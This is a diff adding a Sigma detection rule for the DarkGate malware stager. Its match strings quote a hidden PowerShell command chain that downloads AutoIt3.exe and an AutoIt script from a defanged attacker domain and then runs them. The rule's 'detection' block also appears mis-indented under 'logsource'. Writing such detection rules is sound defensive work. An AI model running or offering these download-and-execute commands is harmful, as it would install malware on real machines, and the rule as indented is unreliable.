@@ -1,0 +1,22 @@
+title: DarkGate Detection Rule
+id: 6546201f-9f63-4c91-9662-92f2d0a8bc15
+description: Stager download via PowerShell
+author: Christian Henriksen @ Trifork Security
+status: experimental
+date: 2023/10/14
+level: high
+references:
+    - https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2023-10-12-IOCs-for-DarkGate-from-Teams-chat.txt
+logsource:
+    category: process_creation
+    product: windows
+    detection:
+    selection:
+        CommandLine|contains:
+            - '-WindowStyle Hidden -Command "&{ ni "C:\temp" -Type Directory -Force;'
+            - 'Invoke-WebRequest -Uri "hxxp://hgfdytrywq[.]com:80/a" -OutFile "AutoIt3.exe";'
+            - 'Invoke-WebRequest -Uri "hxxp://hgfdytrywq[.]com:80/xmbxmi" -OutFile "nAdowY.au3";'
+            - 'start "AutoIt3.exe" -a "nAdowY.au3"}"'
+        Image|contains:
+            - '\powershell.exe'
+            - '\pwsh.exe'
